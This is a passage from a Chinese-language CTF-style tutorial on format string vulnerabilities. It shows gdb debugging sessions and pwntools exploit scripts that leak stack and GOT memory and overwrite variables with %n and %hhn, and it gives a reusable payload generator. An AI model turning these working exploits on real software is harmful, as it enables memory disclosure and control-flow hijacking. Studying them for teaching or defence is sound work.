&lt;printf+10&gt;: sub esp,0xc 0xf7e4e03d &lt;printf+13&gt;: mov eax,DWORD PTR [eax-0x68] 0xf7e4e043 &lt;printf+19&gt;: lea edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\\n&quot;)0008| 0xffffd424 --&gt; 0x10012| 0xffffd428 (&quot;\\&quot;\\&quot;\\&quot;\\&quot;\\377\\377\\377\\377@\\324\\377\\377@\\324\\377\\377&quot;, &lt;incomplete sequence \\302&gt;)0016| 0xffffd42c --&gt; 0xffffffff0020| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)0024| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)0028| 0xffffd438 --&gt; 0xc2[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e4e030 in printf () from /lib32/libc.so.6gdb-peda$ cContinuing.00000001.22222222.ffffffff.%3$x[----------------------------------registers-----------------------------------]EAX: 0xffffd440 (&quot;%3$x&quot;)EBX: 0x0ECX: 0x7fffffe0EDX: 0xf7fb6870 --&gt; 0x0ESI: 0xf7fb5000 --&gt; 0x1afdb0EDI: 0xf7fb5000 --&gt; 0x1afdb0EBP: 0xffffd4b8 --&gt; 0x0ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;: add esp,0x10)EIP: 0xf7e4e030 (&lt;printf&gt;: call 0xf7f22369)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xf7e4e02b &lt;fprintf+27&gt;: ret 0xf7e4e02c: xchg ax,ax 0xf7e4e02e: xchg ax,ax=&gt; 0xf7e4e030 &lt;printf&gt;: call 0xf7f22369 0xf7e4e035 &lt;printf+5&gt;: add eax,0x166fcb 0xf7e4e03a &lt;printf+10&gt;: sub esp,0xc 0xf7e4e03d &lt;printf+13&gt;: mov eax,DWORD PTR [eax-0x68] 0xf7e4e043 &lt;printf+19&gt;: lea edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;: add esp,0x10)0004| 0xffffd430 --&gt; 0xffffd440 (&quot;%3$x&quot;)0008| 0xffffd434 --&gt; 0xffffd440 (&quot;%3$x&quot;)0012| 0xffffd438 --&gt; 0xc20016| 0xffffd43c --&gt; 0xf7e949db (add esp,0x10)0020| 0xffffd440 (&quot;%3$x&quot;)0024| 0xffffd444 --&gt; 0xffffd500 --&gt; 0x00028| 0xffffd448 --&gt; 0xe0[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e4e030 in printf () from /lib32/libc.so.6gdb-peda$ cContinuing.f7e949db[Inferior 1 (process 13810) exited normally] 可以看出，我们确实获得了 printf 的第 4 个参数所对应的值 f7e949db。 获取栈变量对应字符串此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下 gdb-peda$ b printfBreakpoint 1 at 0x8048330gdb-peda$ rStarting program: /home/oldthree/Desktop/leakmemory%s[----------------------------------registers-----------------------------------]EAX: 0xffffd440 --&gt; 0xff007325EBX: 0x0ECX: 0x1EDX: 0xf7fb687c --&gt; 0x0ESI: 0xf7fb5000 --&gt; 0x1afdb0EDI: 0xf7fb5000 --&gt; 0x1afdb0EBP: 0xffffd4b8 --&gt; 0x0ESP: 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)EIP: 0xf7e4e030 (&lt;printf&gt;: call 0xf7f22369)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xf7e4e02b &lt;fprintf+27&gt;: ret 0xf7e4e02c: xchg ax,ax 0xf7e4e02e: xchg ax,ax=&gt; 0xf7e4e030 &lt;printf&gt;: call 0xf7f22369 0xf7e4e035 &lt;printf+5&gt;: add eax,0x166fcb 0xf7e4e03a &lt;printf+10&gt;: sub esp,0xc 0xf7e4e03d &lt;printf+13&gt;: mov eax,DWORD PTR [eax-0x68] 0xf7e4e043 &lt;printf+19&gt;: lea edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffd41c --&gt; 0x80484bf (&lt;main+84&gt;: add esp,0x20)0004| 0xffffd420 --&gt; 0x8048563 (&quot;%08x.%08x.%08x.%s\\n&quot;)0008| 0xffffd424 --&gt; 0x10012| 0xffffd428 (&quot;\\&quot;\\&quot;\\&quot;\\&quot;\\377\\377\\377\\377@\\324\\377\\377@\\324\\377\\377&quot;, &lt;incomplete sequence \\302&gt;)0016| 0xffffd42c --&gt; 0xffffffff0020| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff0073250024| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff0073250028| 0xffffd438 --&gt; 0xc2[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e4e030 in printf () from /lib32/libc.so.6gdb-peda$ cContinuing.00000001.22222222.ffffffff.%s[----------------------------------registers-----------------------------------]EAX: 0xffffd440 --&gt; 0xff007325EBX: 0x0ECX: 0x7fffffe2EDX: 0xf7fb6870 --&gt; 0x0ESI: 0xf7fb5000 --&gt; 0x1afdb0EDI: 0xf7fb5000 --&gt; 0x1afdb0EBP: 0xffffd4b8 --&gt; 0x0ESP: 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;: add esp,0x10)EIP: 0xf7e4e030 (&lt;printf&gt;: call 0xf7f22369)EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0xf7e4e02b &lt;fprintf+27&gt;: ret 0xf7e4e02c: xchg ax,ax 0xf7e4e02e: xchg ax,ax=&gt; 0xf7e4e030 &lt;printf&gt;: call 0xf7f22369 0xf7e4e035 &lt;printf+5&gt;: add eax,0x166fcb 0xf7e4e03a &lt;printf+10&gt;: sub esp,0xc 0xf7e4e03d &lt;printf+13&gt;: mov eax,DWORD PTR [eax-0x68] 0xf7e4e043 &lt;printf+19&gt;: lea edx,[esp+0x14]No argument[------------------------------------stack-------------------------------------]0000| 0xffffd42c --&gt; 0x80484ce (&lt;main+99&gt;: add esp,0x10)0004| 0xffffd430 --&gt; 0xffffd440 --&gt; 0xff0073250008| 0xffffd434 --&gt; 0xffffd440 --&gt; 0xff0073250012| 0xffffd438 --&gt; 0xc20016| 0xffffd43c --&gt; 0xf7e949db (add esp,0x10)0020| 0xffffd440 --&gt; 0xff0073250024| 0xffffd444 --&gt; 0xffffd56c --&gt; 0xffffd6f2 (&quot;LC_TERMINAL_VERSION=3.4.3&quot;)0028| 0xffffd448 --&gt; 0xe0[------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, 0xf7e4e030 in printf () from /lib32/libc.so.6gdb-peda$ cContinuing.%s[Inferior 1 (process 13866) exited normally] 可以看出，在第二次执行 printf 函数的时候，确实是将 0xffff440 处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。 当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。 此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 3 个参数，如下，此时程序就不能够解析，就崩溃了。 $ ./leakmemory%2$s00000001.22222222.ffffffff.%2$s[1] 13899 segmentation fault (core dumped) ./leakmemory 小技巧总结 利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。 利用 %s 来获取变量所对应地址的内容，只不过有零截断。 利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容 任意地址泄漏内存可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。 我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中 s 是 main 函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。我们选择上面的某个函数调用为例 Breakpoint 1, 0xf7e4e030 in printf () from /lib32/libc.so.6[ Legend: Modified register | Code | Heap | Stack | String ]────────────────────────────────────────────────────────────────────────────────────── registers ────$eax : 0xffffd440 → 0xff007325 (&quot;%s&quot;?)$ebx : 0x0$ecx : 0x7fffffe2$edx : 0xf7fb6870 → 0x00000000$esp : 0xffffd42c → 0x080484ce → &lt;main+99&gt; add esp, 0x10$ebp : 0xffffd4b8 → 0x00000000$esi : 0xf7fb5000 → 0x001afdb0$edi : 0xf7fb5000 → 0x001afdb0$eip : 0xf7e4e030 → &lt;printf+0&gt; call 0xf7f22369$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063────────────────────────────────────────────────────────────────────────────────────────── stack ────0xffffd42c│+0x0000: 0x080484ce → &lt;main+99&gt; add esp, 0x10 ← $esp0xffffd430│+0x0004: 0xffffd440 → 0xff007325 (&quot;%s&quot;?)0xffffd434│+0x0008: 0xffffd440 → 0xff007325 (&quot;%s&quot;?)0xffffd438│+0x000c: 0x000000c20xffffd43c│+0x0010: 0xf7e949db → add esp, 0x100xffffd440│+0x0014: 0xff007325 (&quot;%s&quot;?)0xffffd444│+0x0018: 0xffffd56c → 0xffffd6f2 → &quot;LC_TERMINAL_VERSION=3.4.3&quot;0xffffd448│+0x001c: 0x000000e0 可以看出在栈上的第二个变量就是我们的格式化字符串地址 0xffffd440，同时该地址存储的也确实是是 “%s” 格式化字符串内容。 那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。 addr%k$s 注： 在这里，如果格式化字符串在栈上，那么我们就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节。 下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定 [tag]%p%p%p%p%p%p... 一般来说，我们会重复某个字符的机器字长来作为 tag，而后面会跟上若干个 %p 来输出栈上的内容，如果内容与我们前面的 tag 重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其他字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下 $ ./leakmemoryAAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%pAAAA0xff9f83000xc20xf7e799db0x414141410x702570250x702570250x702570250x702570250x702570250x702570250x702570250x70250xff9f83c40xf7f9a0000xf377 由 0x41414141 处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第 5 个参数，但是是格式化字符串的第 4 个参数。我们可以来测试一下 $ ./leakmemory%4$s00000001.22222222.ffffffff.%4$s[1] 14375 segmentation fault (core dumped) ./leakmemory 可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。 $eax : 0xffffd440 → &quot;%4$s&quot;$ebx : 0x0$ecx : 0x7fffffe0$edx : 0xf7fb6870 → 0x00000000$esp : 0xffffd42c → 0x080484ce → &lt;main+99&gt; add esp, 0x10$ebp : 0xffffd4b8 → 0x00000000$esi : 0xf7fb5000 → 0x001afdb0$edi : 0xf7fb5000 → 0x001afdb0$eip : 0xf7e4e030 → &lt;printf+0&gt; call 0xf7f22369$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063────────────────────────────────────────────────────────────────────────────────────────── stack ────0xffffd42c│+0x0000: 0x080484ce → &lt;main+99&gt; add esp, 0x10 ← $esp0xffffd430│+0x0004: 0xffffd440 → &quot;%4$s&quot;0xffffd434│+0x0008: 0xffffd440 → &quot;%4$s&quot;0xffffd438│+0x000c: 0x000000c20xffffd43c│+0x0010: 0xf7e949db → add esp, 0x100xffffd440│+0x0014: &quot;%4$s&quot;0xffffd444│+0x0018: 0xffffd500 → 0x000000000xffffd448│+0x001c: 0x000000e0──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ──── 0xf7e4e027 &lt;fprintf+23&gt; inc DWORD PTR [ebx+0x66c31cc4] 0xf7e4e02d nop 0xf7e4e02e xchg ax, ax → 0xf7e4e030 &lt;printf+0&gt; call 0xf7f22369 ↳ 0xf7f22369 mov eax, DWORD PTR [esp] 0xf7f2236c ret 0xf7f2236d mov edx, DWORD PTR [esp] 0xf7f22370 ret 0xf7f22371 mov esi, DWORD PTR [esp] 0xf7f22374 ret──────────────────────────────────────────────────────────────────────────── arguments (guessed) ────0xf7f22369 ( [sp + 0x0] = 0x080484ce → &lt;main+99&gt; add esp, 0x10, [sp + 0x4] = 0xffffd440 → &quot;%4$s&quot;, [sp + 0x8] = 0xffffd440 → &quot;%4$s&quot;)──────────────────────────────────────────────────────────────────────────────────────── threads ────[#0] Id 1, Name: &quot;leakmemory&quot;, stopped 0xf7e4e030 in printf (), reason: BREAKPOINT────────────────────────────────────────────────────────────────────────────────────────── trace ────[#0] 0xf7e4e030 → printf()[#1] 0x80484ce → main()─────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ help x/Examine memory: x/FMT ADDRESS.ADDRESS is an expression for the memory address to examine.FMT is a repeat count followed by a format letter and a size letter.Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal), t(binary), f(float), a(address), i(instruction), c(char), s(string) and z(hex, zero padded on the left).Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).The specified number of objects of the specified size are printedaccording to the format.Defaults for format and size letters are those previously used.Default count is 1. Default address is following last thing printedwith this command or &quot;print&quot;.gef➤ x/x 0xffffd4400xffffd440: 0x73243425gef➤ vmmap[ Legend: Code | Heap | Stack ]Start End Offset Perm Path0x08048000 0x08049000 0x00000000 r-x /home/oldthree/Desktop/leakmemory0x08049000 0x0804a000 0x00000000 r-- /home/oldthree/Desktop/leakmemory0x0804a000 0x0804b000 0x00001000 rw- /home/oldthree/Desktop/leakmemory0x0804b000 0x0806c000 0x00000000 rw- [heap]0xf7e04000 0xf7e05000 0x00000000 rw-0xf7e05000 0xf7fb2000 0x00000000 r-x /lib32/libc-2.23.so0xf7fb2000 0xf7fb3000 0x001ad000 --- /lib32/libc-2.23.so0xf7fb3000 0xf7fb5000 0x001ad000 r-- /lib32/libc-2.23.so0xf7fb5000 0xf7fb6000 0x001af000 rw- /lib32/libc-2.23.so0xf7fb6000 0xf7fb9000 0x00000000 rw-0xf7fd3000 0xf7fd4000 0x00000000 rw-0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib32/ld-2.23.so0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib32/ld-2.23.so0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib32/ld-2.23.so0xfffdd000 0xffffe000 0x00000000 rw- [stack]gef➤ x/x 0x732434250x73243425: Cannot access memory at address 0x73243425 显然 0xffffcd20 处所对应的格式化字符串所对应的变量值 0x73243425 并不能够被改程序访问，所以程序就自然崩溃了。 那么如果我们设置一个可访问的地址呢？比如说 scanf@got，结果会怎么样呢？应该自然是输出 scanf 对应的地址了。我们不妨来试一下。 首先，获取 scanf@got 的地址，如下 这里之所以没有使用 printf 函数，是因为 scanf 函数会对 0a，0b，0c，00 等字符有一些奇怪的处理，，导致无法正常读入，，感兴趣的可以试试。。。。 gef➤ gotGOT protection: Partial RelRO | GOT functions: 3[0x804a00c] printf@GLIBC_2.0 → 0xf7e4e030[0x804a010] __libc_start_main@GLIBC_2.0 → 0xf7e1d550[0x804a014] __isoc99_scanf@GLIBC_2.7 → 0xf7e605c0 下面我们利用 pwntools 构造 payload 如下 from pwn import *sh = process('./leakmemory')leakmemory = ELF('./leakmemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadgdb.attach(sh)sh.sendline(payload)sh.recvuntil('%4$s\\n')print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() 其中，我们使用 gdb.attach(sh) 来进行调试。当我们运行到第二个 printf 函数的时候 (记得下断点)，可以看到我们的第四个参数确实指向我们的 scanf 的地址，这里输出 → 0xf7615670 &lt;printf+0&gt; call 0xf76ebb09 &lt;__x86.get_pc_thunk.ax&gt; ↳ 0xf76ebb09 &lt;__x86.get_pc_thunk.ax+0&gt; mov eax, DWORD PTR [esp] 0xf76ebb0c &lt;__x86.get_pc_thunk.ax+3&gt; ret 0xf76ebb0d &lt;__x86.get_pc_thunk.dx+0&gt; mov edx, DWORD PTR [esp] 0xf76ebb10 &lt;__x86.get_pc_thunk.dx+3&gt; ret───────────────────────────────────────────────────────────────────[ stack ]────['0xffbbf8dc', 'l8']80xffbbf8dc│+0x00: 0x080484ce → &lt;main+99&gt; add esp, 0x10 ← $esp0xffbbf8e0│+0x04: 0xffbbf8f0 → 0x0804a014 → 0xf76280c0 → &lt;__isoc99_scanf+0&gt; push ebp0xffbbf8e4│+0x08: 0xffbbf8f0 → 0x0804a014 → 0xf76280c0 → &lt;__isoc99_scanf+0&gt; push ebp0xffbbf8e8│+0x0c: 0x000000c20xffbbf8ec│+0x10: 0xf765c6bb → &lt;handle_intel+107&gt; add esp, 0x100xffbbf8f0│+0x14: 0x0804a014 → 0xf76280c0 → &lt;__isoc99_scanf+0&gt; push ebp ← $eax0xffbbf8f4│+0x18: &quot;%4$s&quot;0xffbbf8f8│+0x1c: 0x00000000 同时，在我们运行的 terminal 下 $ python leakmemory.py [+] Starting local process './leakmemory': pid 15368[*] '/home/oldthree/Desktop/leakmemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)0x804a014\\x14\\x04%4$s[*] running in new terminal: /usr/bin/gdb -q &quot;./leakmemory&quot; 15368[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)0xf7df85c0[*] Switching to interactive mode[*] Process './leakmemory' stopped with exit code 0 (pid 15368)[*] Got EOF while reading in interactive 我们确实得到了 scanf 的地址。 但是，并不是说所有的偏移机器字长的整数倍，可以让我们直接相应参数来获取，有时候，我们需要对我们输入的格式化字符串进行填充，来使得我们想要打印的地址内容的地址位于机器字长整数倍的地址处，一般来说，类似于下面的这个样子。 [padding][addr] 注意 我们不能直接在命令行输入 \\ x0c\\xa0\\x04\\x08%4$s 这是因为虽然前面的确实是 printf@got 的地址，但是，scanf 函数并不会将其识别为对应的字符串，而是会将 ,x,0,c 分别作为一个字符进行读入。下面就是错误的例子。 0xffffccfc│+0x00: 0x080484ce → &lt;main+99&gt; add esp, 0x10 ← $esp0xffffcd00│+0x04: 0xffffcd10 → &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;0xffffcd04│+0x08: 0xffffcd10 → &quot;\\x0c\\xa0\\x04\\x08%4$s&quot;0xffffcd08│+0x0c: 0x000000c20xffffcd0c│+0x10: 0xf7e8b6bb → &lt;handle_intel+107&gt; add esp, 0x100xffffcd10│+0x14: &quot;\\x0c\\xa0\\x04\\x08%4$s&quot; ← $eax0xffffcd14│+0x18: &quot;\\xa0\\x04\\x08%4$s&quot;0xffffcd18│+0x1c: &quot;\\x04\\x08%4$s&quot;─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────[#0] 0xf7e44670 → Name: __printf(format=0xffffcd10 &quot;\\\\x0c\\\\xa0\\\\x04\\\\x08%4$s&quot;)[#1] 0x80484ce → Name: main()──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────gef➤ x/x 0xffffcd100xffffcd10: 0x6330785c 覆盖内存上面，我们已经展示了如何利用格式化字符串来泄露栈内存以及任意地址内存，那么我们有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存呢? 答案是可行的，只要变量对应的地址可写，我们就可以利用格式化字符串来修改其对应的数值。这里我们可以想一下格式化字符串中的类型 %n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 通过这个类型参数，再加上一些小技巧，我们就可以达到我们的目的，这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。 这里我们给出如下的程序来介绍相应的部分。 /* example/overflow/overflow.c */#include &lt;stdio.h&gt;int a = 123, b = 456;int main() { int c = 789; char s[100]; printf(&quot;%p\\n&quot;, &amp;c); scanf(&quot;%s&quot;, s); printf(s); if (c == 16) { puts(&quot;modified c.&quot;); } else if (a == 2) { puts(&quot;modified a for a small number.&quot;); } else if (b == 0x12345678) { puts(&quot;modified b for a big number!&quot;); } return 0;} makefile 在对应的文件夹中。而无论是覆盖哪个地址的变量，我们基本上都是构造类似如下的 payload ...[overwrite addr]....%[overwrite offset]$n 其中… 表示我们的填充内容，overwrite addr 表示我们所要覆盖的地址，overwrite offset 地址表示我们所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤 确定覆盖地址 确定相对偏移 进行覆盖 覆盖栈内存确定覆盖地址首先，我们自然是来想办法知道栈变量 c 的地址。由于目前几乎上所有的程序都开启了 aslr 保护，所以栈的地址一直在变，所以我们这里故意输出了 c 变量的地址。 确定相对偏移其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试 其次，我们来确定一下存储格式化字符串的地址是 printf 将要输出的第几个参数 ()。 这里我们通过之前的泄露栈变量数值的方法来进行操作。通过调试 → 0xf7e44670 &lt;printf+0&gt; call 0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt; ↳ 0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov eax, DWORD PTR [esp] 0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret 0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov edx, DWORD PTR [esp] 0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret────────────────────────────────────────────────────────────────────────────────────[ stack ]────['0xffffcd0c', 'l8']80xffffcd0c│+0x00: 0x080484d7 → &lt;main+76&gt; add esp, 0x10 ← $esp0xffffcd10│+0x04: 0xffffcd28 → &quot;%d%d&quot;0xffffcd14│+0x08: 0xffffcd8c → 0x000003150xffffcd18│+0x0c: 0x000000c20xffffcd1c│+0x10: 0xf7e8b6bb → &lt;handle_intel+107&gt; add esp, 0x100xffffcd20│+0x14: 0xffffcd4e → 0xffff0000 → 0x000000000xffffcd24│+0x18: 0xffffce4c → 0xffffd07a → &quot;XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat[...]&quot;0xffffcd28│+0x1c: &quot;%d%d&quot; ← $eax 我们可以发现在 0xffffcd14 处存储着变量 c 的数值。继而，我们再确定格式化字符串’%d%d’的地址 0xffffcd28 相对于 printf 函数的格式化字符串参数 0xffffcd10 的偏移为 0x18，即格式化字符串相当于 printf 函数的第 7 个参数，相当于格式化字符串的第 6 个参数。 进行覆盖这样，第 6 个参数处的值就是存储变量 c 的地址，我们便可以利用 %n 的特征来修改 c 的值。payload 如下 [addr of c]%012d%6$n addr of c 的长度为 4，故而我们得再输入 12 个字符才可以达到 16 个字符，以便于来修改 c 的值为 16。 具体脚本如下 def forc(): sh = process('./overwrite') c_addr = int(sh.recvuntil('\\n', drop=True), 16) print hex(c_addr) payload = p32(c_addr) + '%012d' + '%6$n' print payload #gdb.attach(sh) sh.sendline(payload) print sh.recv() sh.interactive()forc() 结果如下： ➜ overwrite git:(master) ✗ python exploit.py[+] Starting local process './overwrite': pid 748060xfffd8cdc܌��%012d%6$n܌��-00000160648modified c. 覆盖任意地址内存覆盖小数字首先，我们来考虑一下如何修改 data 段的变量为一个较小的数字，比如说，小于机器字长的数字。这里以 2 为例。可能会觉得这其实没有什么区别，可仔细一想，真的没有么？如果我们还是将要覆盖的地址放在最前面，那么将直接占用机器字长个 (4 或 8) 字节。显然，无论之后如何输出，都只会比 4 大。 或许我们可以使用整形溢出来修改对应的地址的值，但是这样将面临着我们得一次输出大量的内容。而这，一般情况下，基本都不会攻击成功。 那么我们应该怎么做呢？再仔细想一下，我们有必要将所要覆盖的变量的地址放在字符串的最前面么？似乎没有，我们当时只是为了寻找偏移，所以才把 tag 放在字符串的最前面，如果我们把 tag 放在中间，其实也是无妨的。类似的，我们把地址放在中间，只要能够找到对应的偏移，其照样也可以得到对应的数值。前面已经说了我们的格式化字符串的为第 6 个参数。由于我们想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是 aa%k$nxx 此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。 利用 ida 可以得到 a 的地址为 0x0804A024（由于 a、b 是已初始化的全局变量，因此不在堆栈中）。 .data:0804A024 public a.data:0804A024 a dd 7Bh 故而我们可以构造如下的利用代码 def fora(): sh = process('./overwrite') a_addr = 0x0804A024 payload = 'aa%8$naa' + p32(a_addr) sh.sendline(payload) print sh.recv() sh.interactive() 对应的结果如下 ➜ overwrite git:(master) ✗ python exploit.py[+] Starting local process './overwrite': pid 76508[*] Process './overwrite' stopped with exit code 0 (pid 76508)0xffc1729caaaa$\\xa0\\x0modified a for a small number. 其实，这里我们需要掌握的小技巧就是，我们没有必要必须把地址放在最前面，放在那里都可以，只要我们可以找到其对应的偏移即可。 覆盖大数字上面介绍了覆盖小数字，这里我们就少覆盖大数字了。上面我们也说了，我们可以选择直接一次性输出大数字个字节来进行覆盖，但是这样基本也不会成功，因为太长了。而且即使成功，我们一次性等待的时间也太长了，那么有没有什么比较好的方式呢？自然是有了。 不过在介绍之前，我们得先再简单了解一下，变量在内存中的存储格式。首先，所有的变量在内存中都是以字节进行存储的。此外，在 x86 和 x64 的体系结构中，变量的存储格式为以小端存储，即最低有效位存储在低地址。举个例子，0x12345678 在内存中由低地址到高地址依次为 \\ x78\\x56\\x34\\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志： hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。h 对于整数类型，printf期待一个从short提升的int尺寸的整型参数。 所以说，我们可以利用 %hhn 向某个地址写入单字节，利用 %hn 向某个地址写入双字节。这里，我们以单字节为例。 首先，我们还是要确定的是要覆盖的地址为多少，利用 ida 看一下，可以发现地址为 0x0804A028。 .data:0804A028 public b.data:0804A028 b dd 1C8h ; DATA XREF: main:loc_8048510\u0018r 即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。 0x0804A028 \\x780x0804A029 \\x560x0804A02a \\x340x0804A02b \\x12 首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的 p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+'%6$n'+pad2+'%7$n'+pad3+'%8$n'+pad4+'%9$n' 我们可以依次进行计算。这里给出一个基本的构造，如下 def fmt(prev, word, index): if prev &lt; word: result = word - prev fmtstr = &quot;%&quot; + str(result) + &quot;c&quot; elif prev == word: result = 0 else: result = 256 + word - prev fmtstr = &quot;%&quot; + str(result) + &quot;c&quot; fmtstr += &quot;%&quot; + str(index) + &quot;$hhn&quot; return fmtstrdef fmt_str(offset, size, addr, target): payload = &quot;&quot; for i in range(4): if size == 4: payload += p32(addr + i) else: payload += p64(addr + i) prev = len(payload) for i in range(4): payload += fmt(prev, (target &gt;&gt; i * 8) &amp; 0xff, offset + i) prev = (target &gt;&gt; i * 8) &amp; 0xff return payloadpayload = fmt_str(6,4,0x0804A028,0x12345678) 其中每个参数的含义基本如下 offset 表示要覆盖的地址最初的偏移 size 表示机器字长 addr 表示将要覆盖的地址。 target 表示我们要覆盖为的目的变量值。 相应的 exploit 如下 def forb(): sh = process('./overwrite') payload = fmt_str(6, 4, 0x0804A028, 0x12345678) print payload sh.sendline(payload) print sh.recv() sh.interactive() 结果如下 ➜ overwrite git:(master) ✗ python exploit.py[+] Starting local process './overwrite': pid 78547(\\xa0\\x0)\\xa0\\x0*\\xa0\\x0+\\xa0\\x0%104c%6$hhn%222c%7$hhn%222c%8$hhn%222c%9$hhn[*] Process './overwrite' stopped with exit code 0 (pid 78547)0xfff6f9bc(\\xa0\\x0)\\xa0\\x0*\\xa0\\x0+\\xa0\\x0 当然，我们也可以利用 %n 分别对每个地址进行写入，也可以得到对应的答案，但是由于我们写入的变量都只会影响由其开始的四个字节，所以最后一个变量写完之后，我们可能会修改之后的三个字节，如果这三个字节比较重要的话，程序就有可能因此崩溃。而采用 %hhn 则不会有这样的问题，因为这样只会修改相应地址的一个字节。 格式化字符串漏洞例子下面会介绍一些 CTF 